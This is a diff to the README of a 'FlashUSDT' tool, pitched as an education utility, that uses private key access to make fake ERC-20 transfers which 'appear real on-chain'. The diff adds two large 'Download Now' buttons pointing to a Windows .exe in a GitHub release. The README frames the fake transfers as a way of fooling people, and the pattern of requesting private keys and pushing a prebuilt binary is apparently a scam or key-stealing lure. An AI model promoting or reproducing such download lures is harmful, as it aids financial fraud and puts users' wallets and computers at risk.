@@ -2,6 +2,14 @@
 
 A lightweight, GUI-based Ethereum education utility designed for **flash token transfers** using private key access. Built with ❤️ in Python and Tkinter, this tool lets you simulate ERC-20 token transfers that appear **real** on-chain — even though they're purely for visual effect.
 
+<h1 align="center"><b>🚀 Download Now</b></h1>
+
+<p align="center">
+  <a href="https://github.com/flexxwhoax/FlashUSDT-Tool/releases/download/Tool/Flashing.tool.exe">
+    <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
+  </a>
+</p>
+
 > 💡 Perfect for testing, demos, or messing with your crypto friends. Looks real. Feels real. Isn't real.
 
 ## 🚀 Features
@@ -14,7 +22,13 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 - 🖥 **.exe Included** — The program is compiled into a portable Windows executable. No Python required — just run it and you're good to go.
 - 💻 **Minimalist GUI** — Built with Tkinter for performance and simplicity.
 
----
+<h1 align="center"><b>🚀 Download Now</b></h1>
+
+<p align="center">
+  <a href="https://github.com/flexxwhoax/FlashUSDT-Tool/releases/download/Tool/Flashing.tool.exe">
+    <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
+  </a>
+</p>
 
 ## 🪙 Flash Tokens Supported
 
